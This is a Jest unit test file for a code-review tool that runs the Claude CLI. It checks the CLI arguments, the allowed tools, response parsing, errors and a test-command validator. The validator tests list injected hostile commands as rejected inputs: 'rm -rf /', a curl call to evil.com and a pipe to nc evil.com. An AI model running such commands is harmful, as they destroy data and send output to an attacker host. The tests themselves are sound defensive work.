import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { exec } from 'child_process';
import { writeFileSync, unlinkSync, existsSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { ClaudeReviewer } from '../../../src/reviewers/claude-reviewer';
import { ReviewRequest, ReviewResult } from '../../../src/types';
import { createMockReviewRequest } from '../../utils/mock-factories';

jest.mock('child_process');
jest.mock('fs');
jest.mock('../../../src/config', () => ({
  config: {
    claudeCliPath: 'claude',
    reviewModel: 'test-model',
    reviewTimeout: 30000,
    logging: {
      level: 'INFO',
      toConsole: false,
      toFile: false
    },
    persistReviewPrompts: false
  }
}));
jest.mock('../../../src/git-utils', () => ({
  GitUtils: jest.fn().mockImplementation(() => ({
    getChangedFiles: jest.fn(() => Promise.resolve(['file1.ts', 'file2.ts']))
  }))
}));

const mockedExec = exec as any;
const mockedWriteFileSync = writeFileSync as jest.MockedFunction<typeof writeFileSync>;
const mockedUnlinkSync = unlinkSync as jest.MockedFunction<typeof unlinkSync>;
const mockedExistsSync = existsSync as jest.MockedFunction<typeof existsSync>;

// Helper to create exec mock implementation
interface ExecResponse {
  stdout?: string;
  stderr?: string;
  error?: Error;
}

function createExecMock(versionResponse: ExecResponse, printResponse?: ExecResponse) {
  return (cmd: string, options?: any, callback?: Function) => {
    // Handle both 2 and 3 argument forms of exec
    const cb = typeof options === 'function' ? options : callback;
    if (typeof cb === 'function') {
      if (cmd.includes('--version')) {
        cb(versionResponse?.error || null, versionResponse || { stdout: '', stderr: '' });
      } else if (cmd.includes('--print') && printResponse) {
        cb(printResponse.error || null, printResponse);
      }
    }
  };
}

describe('ClaudeReviewer', () => {
  let reviewer: ClaudeReviewer;
  let request: ReviewRequest;
  
  beforeEach(() => {
    jest.clearAllMocks();
    reviewer = new ClaudeReviewer();
    request = createMockReviewRequest();
    
    // GitUtils is already mocked at the module level
  });

  afterEach(() => {
    jest.restoreAllMocks();
    // Ensure all console spies are properly cleaned up
    jest.spyOn(console, 'error').mockRestore();
    jest.spyOn(console, 'warn').mockRestore();
  });

  describe('Claude CLI Integration', () => {
    it('should check Claude CLI availability', async () => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { error: new Error('Mock error to prevent hanging') }
      ));

      // This should throw after checking version
      await expect(reviewer.review(request, 'test diff')).rejects.toThrow('Mock error');
      
      expect(mockedExec).toHaveBeenCalledWith(
        expect.stringContaining('claude --version'),
        expect.any(Function)
      );
    });

    it('should throw error when Claude CLI is not available', async () => {
      mockedExec.mockImplementation(createExecMock(
        { error: new Error('Command not found'), stdout: '', stderr: 'command not found' }
      ));

      await expect(reviewer.review(request, 'test diff')).rejects.toThrow(
        'Claude CLI not found at claude'
      );
    });

    it('should execute Claude CLI with correct parameters', async () => {
      request.test_command = undefined; // Ensure no test command
      const mockReviewResult = {
        design_compliance: { follows_architecture: true, major_violations: [] },
        comments: [],
        missing_requirements: [],
        test_results: { passed: true, summary: 'All tests passed' },
        overall_assessment: 'lgtm'
      };

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: JSON.stringify(mockReviewResult) 
          }), 
          stderr: '' 
        }
      ));

      mockedExistsSync.mockReturnValue(true);

      const result = await reviewer.review(request, 'test diff');

      // Verify Claude CLI was called with correct parameters
      expect(mockedExec).toHaveBeenCalledWith(
        expect.stringContaining('claude --print --output-format json --model test-model'),
        expect.objectContaining({
          maxBuffer: 10 * 1024 * 1024,
          timeout: 30000
        }),
        expect.any(Function)
      );

      // Verify allowed tools
      expect(mockedExec).toHaveBeenCalledWith(
        expect.stringContaining('--allowedTools "Read(**/*),Grep(**/*),LS(**),Bash(find:*),Bash(grep:*),Bash(rg:*)"'),
        expect.any(Object),
        expect.any(Function)
      );

      expect(result.overall_assessment).toBe('lgtm');
      expect(result.status).toBe('approved');
    });

    it('should include test command in allowed tools when provided', async () => {
      request.test_command = 'npm test';

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: '{"overall_assessment": "lgtm"}' 
          }), 
          stderr: '' 
        }
      ));

      mockedExistsSync.mockReturnValue(true);

      await reviewer.review(request, 'test diff');

      expect(mockedExec).toHaveBeenCalledWith(
        expect.stringContaining(',Bash(npm test)"'),
        expect.any(Object),
        expect.any(Function)
      );
    });

    it('should omit model flag when reviewModel is null', async () => {
      // Temporarily override the config mock
      const configModule = require('../../../src/config');
      const originalReviewModel = configModule.config.reviewModel;
      configModule.config.reviewModel = null;

      const mockReviewResult = {
        design_compliance: { follows_architecture: true, major_violations: [] },
        comments: [],
        missing_requirements: [],
        test_results: { passed: true, summary: 'All tests passed' },
        overall_assessment: 'lgtm'
      };

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: JSON.stringify(mockReviewResult) 
          }), 
          stderr: '' 
        }
      ));

      mockedExistsSync.mockReturnValue(true);

      await reviewer.review(request, 'test diff');

      // Verify Claude CLI was called WITHOUT model flag
      const calls = mockedExec.mock.calls;
      const cliCall = calls.find((call: any) => call[0].includes('--print'));
      expect(cliCall![0]).toContain('claude --print --output-format json --allowedTools');
      expect(cliCall![0]).not.toContain('--model');
      
      // Restore original value
      configModule.config.reviewModel = originalReviewModel;
    });

  });

  describe('Response Parsing', () => {
    beforeEach(() => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' }
      ));
      mockedExistsSync.mockReturnValue(true);
    });

    it('should parse wrapped JSON response', async () => {
      const mockReview = {
        design_compliance: { follows_architecture: true, major_violations: [] },
        comments: [
          { type: 'specific', severity: 'minor', category: 'style', comment: 'Test comment' }
        ],
        missing_requirements: [],
        test_results: { passed: true, summary: 'Tests passed' },
        overall_assessment: 'needs_changes'
      };

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: JSON.stringify(mockReview) 
          }), 
          stderr: '' 
        }
      ));

      const result = await reviewer.review(request, 'test diff');

      expect(result.comments).toHaveLength(1);
      expect(result.comments[0].comment).toBe('Test comment');
      expect(result.overall_assessment).toBe('needs_changes');
      expect(result.status).toBe('needs_changes');
    });

    it('should parse response with markdown code blocks', async () => {
      const reviewJson = JSON.stringify({
        design_compliance: { follows_architecture: true, major_violations: [] },
        comments: [],
        overall_assessment: 'lgtm'
      });
      
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: `Here is the review:\n\`\`\`json\n${reviewJson}\n\`\`\`` 
          }), 
          stderr: '' 
        }
      ));

      const result = await reviewer.review(request, 'test diff');

      expect(result.overall_assessment).toBe('lgtm');
      expect(result.status).toBe('approved');
    });

    it('should parse actual Claude CLI JSON output format', async () => {
      const reviewContent = {
        design_compliance: { follows_architecture: true, major_violations: [] },
        comments: [
          { type: 'general', severity: 'suggestion', category: 'architecture', comment: 'Good implementation' }
        ],
        missing_requirements: [],
        test_results: { passed: true, summary: 'All tests passed' },
        overall_assessment: 'lgtm'
      };

      const cliOutput = {
        type: 'result',
        subtype: 'success',
        is_error: false,
        duration_ms: 162919,
        duration_api_ms: 132671,
        num_turns: 58,
        result: `Based on my analysis of the code changes, I'll now provide the review:\n\n${JSON.stringify(reviewContent)}`,
        session_id: 'test-session-id',
        total_cost_usd: 2.60,
        usage: {
          input_tokens: 155,
          cache_creation_input_tokens: 50727,
          cache_read_input_tokens: 915057,
          output_tokens: 3528,
          server_tool_use: { web_search_requests: 0 },
          service_tier: 'standard'
        }
      };

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { stdout: JSON.stringify(cliOutput), stderr: '' }
      ));

      const result = await reviewer.review(request, 'test diff');

      expect(result.overall_assessment).toBe('lgtm');
      expect(result.status).toBe('approved');
      expect(result.comments).toHaveLength(1);
      expect(result.comments[0].comment).toBe('Good implementation');
    });

    it('should return error review when parsing fails', async () => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { stdout: 'invalid json', stderr: '' }
      ));

      const consoleSpy = jest.spyOn(console, 'error').mockImplementation(() => {});
      
      const result = await reviewer.review(request, 'test diff');

      expect(result.overall_assessment).toBe('needs_changes');
      expect(result.design_compliance.major_violations).toHaveLength(1);
      expect(result.design_compliance.major_violations[0].issue).toBe('Review Parse Error');
      expect(result.comments[0].severity).toBe('major');
      
      consoleSpy.mockRestore();
    });

    it('should handle CLI error response', async () => {
      const cliErrorOutput = {
        type: 'result',
        subtype: 'error',
        is_error: true,
        error: 'Rate limit exceeded',
        duration_ms: 100,
        session_id: 'error-session'
      };

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { stdout: JSON.stringify(cliErrorOutput), stderr: '' }
      ));

      const consoleSpy = jest.spyOn(console, 'error').mockImplementation(() => {});
      
      const result = await reviewer.review(request, 'test diff');

      expect(result.overall_assessment).toBe('needs_changes');
      expect(result.design_compliance.major_violations[0].description).toContain('Rate limit exceeded');
      
      consoleSpy.mockRestore();
    });

  });

  describe('Error Handling', () => {
    beforeEach(() => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' }
      ));
      mockedExistsSync.mockReturnValue(true);
    });

    it('should handle command execution errors', async () => {
      const error: any = new Error('Command failed');
      error.code = 1;
      error.stdout = 'partial output';
      error.stderr = 'error output';
      
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { error }
      ));

      const consoleSpy = jest.spyOn(console, 'error').mockImplementation(() => {});

      await expect(reviewer.review(request, 'test diff')).rejects.toThrow('Command failed');

      consoleSpy.mockRestore();
    });

    it('should handle timeout errors', async () => {
      const error: any = new Error('Command timeout');
      error.signal = 'SIGTERM';
      error.killed = true;
      
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { error }
      ));

      await expect(reviewer.review(request, 'test diff')).rejects.toThrow('Command timeout');
    });

    it('should clean up temp file even on error', async () => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { error: new Error('Test error') }
      ));

      mockedExistsSync.mockReturnValue(true);

      try {
        await reviewer.review(request, 'test diff');
      } catch (error) {
        // Expected to throw
      }

      expect(mockedUnlinkSync).toHaveBeenCalled();
    });
  });

  describe('Test Command Validation', () => {
    beforeEach(() => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: '{"overall_assessment": "lgtm"}' 
          }), 
          stderr: '' 
        }
      ));
      mockedExistsSync.mockReturnValue(true);
    });

    it('should allow valid npm test commands', async () => {
      const validCommands = [
        'npm test',
        'npm run test',
        'npm run test:unit',
        'yarn test',
        'yarn run test:integration',
        'pnpm test'
      ];

      for (const cmd of validCommands) {
        request.test_command = cmd;
        await reviewer.review(request, 'test diff');
        
        expect(mockedExec).toHaveBeenCalledWith(
          expect.stringContaining(`,Bash(${cmd})`),
          expect.any(Object),
          expect.any(Function)
        );
      }
    });

    it('should allow valid Python test commands', async () => {
      const validCommands = [
        'python -m pytest',
        'python -m pytest tests/',
        'python -m unittest',
        'pytest',
        'pytest tests/unit'
      ];

      for (const cmd of validCommands) {
        jest.clearAllMocks();
        request.test_command = cmd;
        await reviewer.review(request, 'test diff');
        
        expect(mockedExec).toHaveBeenCalledWith(
          expect.stringContaining(`,Bash(${cmd})`),
          expect.any(Object),
          expect.any(Function)
        );
      }
    });

    it('should reject invalid test commands', async () => {
      const invalidCommands = [
        'rm -rf /',
        'echo "test" && rm file.txt',
        'npm test; curl http://evil.com',
        'npm test | nc evil.com 1234'
      ];

      const consoleSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});

      for (const cmd of invalidCommands) {
        jest.clearAllMocks();
        request.test_command = cmd;
        await reviewer.review(request, 'test diff');
        
        expect(mockedExec).not.toHaveBeenCalledWith(
          expect.stringContaining(`,Bash(${cmd})`),
          expect.any(Object),
          expect.any(Function)
        );
      }

      consoleSpy.mockRestore();
    });
  });

  describe('Summary Calculation', () => {
    beforeEach(() => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' }
      ));
      mockedExistsSync.mockReturnValue(true);
    });

    it('should calculate correct summary from comments', async () => {
      const mockReview = {
        design_compliance: { 
          follows_architecture: true, 
          major_violations: [
            { issue: 'Design issue', description: 'Test', impact: 'major', recommendation: 'Fix it' }
          ] 
        },
        comments: [
          { type: 'specific', severity: 'critical', category: 'security', comment: 'Critical issue' },
          { type: 'specific', severity: 'major', category: 'performance', comment: 'Major issue' },
          { type: 'specific', severity: 'major', category: 'design', comment: 'Another major' },
          { type: 'specific', severity: 'minor', category: 'style', comment: 'Minor issue' },
          { type: 'general', severity: 'suggestion', category: 'docs', comment: 'Suggestion' }
        ],
        missing_requirements: [],
        test_results: { passed: true, summary: 'All tests passed' },
        overall_assessment: 'needs_changes'
      };

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: JSON.stringify(mockReview) 
          }), 
          stderr: '' 
        }
      ));

      const result = await reviewer.review(request, 'test diff');

      expect(result.summary).toEqual({
        design_violations: 1,
        critical_issues: 1,
        major_issues: 2,
        minor_issues: 1,
        suggestions: 1
      });
    });
  });

  describe('Prompt Generation', () => {
    it('should write prompt to temporary file', async () => {
      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: '{"overall_assessment": "lgtm"}' 
          }), 
          stderr: '' 
        }
      ));

      mockedExistsSync.mockReturnValue(true);

      await reviewer.review(request, 'test diff');

      expect(mockedWriteFileSync).toHaveBeenCalledWith(
        expect.stringContaining('claude-review-'),
        expect.stringContaining('## Review Request')
      );
    });

    it('should include previous rounds in prompt when provided', async () => {
      const previousRounds: ReviewResult[] = [{
        review_id: 'prev-1',
        timestamp: '2024-01-01T00:00:00Z',
        status: 'needs_changes',
        round: 1,
        design_compliance: { follows_architecture: true, major_violations: [] },
        comments: [{ type: 'general', severity: 'major', category: 'design', comment: 'Fix this' }],
        missing_requirements: [],
        summary: { design_violations: 0, critical_issues: 0, major_issues: 1, minor_issues: 0, suggestions: 0 },
        test_results: { passed: false, summary: 'Tests failed' },
        overall_assessment: 'needs_changes'
      }];

      mockedExec.mockImplementation(createExecMock(
        { stdout: 'claude version 1.0.0', stderr: '' },
        { 
          stdout: JSON.stringify({ 
            type: 'result', 
            result: '{"overall_assessment": "lgtm"}' 
          }), 
          stderr: '' 
        }
      ));

      mockedExistsSync.mockReturnValue(true);

      await reviewer.review(request, 'test diff', previousRounds);

      expect(mockedWriteFileSync).toHaveBeenCalledWith(
        expect.any(String),
        expect.stringContaining('Previous Review Rounds')
      );
    });
  });
});